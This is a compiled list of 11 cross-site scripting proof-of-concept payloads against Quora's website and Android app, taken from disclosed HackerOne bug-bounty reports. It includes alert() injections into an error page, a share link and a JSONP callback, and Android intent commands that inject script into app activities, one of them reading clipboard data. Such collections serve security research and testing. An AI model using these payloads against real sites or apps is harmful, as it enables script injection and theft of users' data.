# Quora

11 payloads.

### `dd624598`

```
https://target.com/'-alert(document.domain)-'
```

— [\[target.com\] 429 Too Many Requests Error-Page XSS](https://hackerone.com/reports/189768) · Quora · [bobrov](https://hackerone.com/bobrov)

### `275f65ee`

```
<script type="text/javascript">
...
ga('set', 'dimension1', 'board-'-alert(document.domain)-'');
ga('set', 'dimension2', 'False');
ga('set', 'dimension3', 'False');});});</script>
```

— [\[target.com\] 429 Too Many Requests Error-Page XSS](https://hackerone.com/reports/189768) · Quora · [bobrov](https://hackerone.com/bobrov)

### `ba729190`

```
adb shell
am start -n com.quora.android/com.quora.android.ActionBarContentActivity -e url 'http://test/test' -e html 'XSS<script>alert(123)</script>'
```

**Parameter:** `html`
— [\[Android\] XSS via start ContentActivity](https://hackerone.com/reports/189793) · Quora · [bobrov](https://hackerone.com/bobrov)

### `51124b66`

```
am start -n com.quora.android/com.quora.android.ActionBarContentActivity -e url 'http://test/test' -e html '<script src=//target.com></script>'
am start -n com.quora.android/com.quora.android.ContentActivity -e url 'http://test/test' -e html '<script src=//target.com></script>'
am start -n com.quora.android/com.quora.android.ModalContentActivity -e url 'http://test/test' -e html '<script src=//target.com></script>'
```

**Parameter:** `html`
— [\[Android\] XSS via start ContentActivity](https://hackerone.com/reports/189793) · Quora · [bobrov](https://hackerone.com/bobrov)

### `35a52209`

```
am start -n com.quora.android/com.quora.android.ModalContentActivity -e url 'http://test/test' -e html '<script>alert(QuoraAndroid.getClipboardData());</script>'
```

**Parameter:** `html`
— [\[Android\] XSS via start ContentActivity](https://hackerone.com/reports/189793) · Quora · [bobrov](https://hackerone.com/bobrov)

### `85ff67f3`

```
Intent i = new Intent();
i.setComponent(new ComponentName("com.quora.android","com.quora.android.ActionBarContentActivity"));
i.putExtra("url","http://test/test");
i.putExtra("html","XSS PoC <script>alert(123)</script>");
startActivity(i);
```

**Parameter:** `html`
— [\[Android\] XSS via start ContentActivity](https://hackerone.com/reports/189793) · Quora · [bobrov](https://hackerone.com/bobrov)

### `a31550a4`

```
javascript: window.open(&quot;https://target.com/intent/tweet?text=Answer on @Quora by @User to Question? http://evil.com/nnnn&quot;, &quot;Share Answer to Twitter&quot;, &quot;width=600, height=250&quot;)
```

**Parameter:** `href`
— [XSS when clicking "Share to Twitter" at target.com/widgets/embed_iframe?path=...](https://hackerone.com/reports/258876) · Quora · [stefanovettorazzi](https://hackerone.com/stefanovettorazzi)

### `ff9ff0ea`

```
"-alert(document.domain)-"
```

**Parameter:** `question`
— [XSS when clicking "Share to Twitter" at target.com/widgets/embed_iframe?path=...](https://hackerone.com/reports/258876) · Quora · [stefanovettorazzi](https://hackerone.com/stefanovettorazzi)

### `51d7cb7e`

```
Question ignore "-alert(document.domain)-"?
```

**Parameter:** `question`
— [XSS when clicking "Share to Twitter" at target.com/widgets/embed_iframe?path=...](https://hackerone.com/reports/258876) · Quora · [stefanovettorazzi](https://hackerone.com/stefanovettorazzi)

### `1540d9ca`

```
...
 "js": "require('actions').finishAction('',alert(),'', {\"cont... "}, 
...
```

**Parameter:** `__e2e_action_id`
— [XSS through `__e2e_action_id` delivered by JSONP](https://hackerone.com/reports/259100) · Quora · [0xnan](https://hackerone.com/0xnan)

### `af0889dd`

```
__e2e_action_id=',alert(),'
```

**Parameter:** `__e2e_action_id`
— [XSS through `__e2e_action_id` delivered by JSONP](https://hackerone.com/reports/259100) · Quora · [0xnan](https://hackerone.com/0xnan)
